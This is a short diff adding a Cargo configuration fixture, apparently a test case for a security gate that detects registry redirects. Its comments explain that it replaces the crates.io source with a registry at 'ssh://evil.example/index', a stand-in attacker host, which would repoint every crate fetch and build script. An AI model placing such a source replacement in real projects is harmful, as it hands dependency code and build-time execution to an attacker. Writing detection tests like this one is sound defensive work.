@@ -1,0 +1,10 @@
+# Round-6 Issue 1: a source-replacement chain whose terminal registry uses a
+# non-https REMOTE transport (ssh://). cargo treats git://host/… and
+# ssh://host/… as valid git-registry index transports, so this silently
+# repoints every crates.io fetch (+ build.rs) to the attacker host. A trivial
+# scheme swap must NOT evade the redirect gate.
+[source.crates-io]
+replace-with = "evil"
+
+[source.evil]
+registry = "ssh://evil.example/index"
